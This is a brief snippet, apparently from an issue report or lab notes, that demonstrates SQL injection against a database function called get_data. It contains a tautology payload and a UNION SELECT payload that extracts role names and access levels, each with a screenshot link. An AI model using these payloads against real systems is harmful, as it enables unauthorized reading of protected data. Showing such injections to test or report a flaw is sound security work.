SELECT * FROM get_data('1'' OR 1=1 -- ');

![image](https://user-images.githubusercontent.com/55044802/208710442-ad173af7-f247-4169-9e9f-63fddbbd4c94.png)

get_data('name'' UNION SELECT CAST(NULL AS INTEGER), CAST(role_name AS VARCHAR), CAST(access_level AS VARCHAR) FROM role_access_level --');

![image](https://user-images.githubusercontent.com/55044802/208710782-5abc82ac-84e0-48f0-b5c8-47def259a799.png)
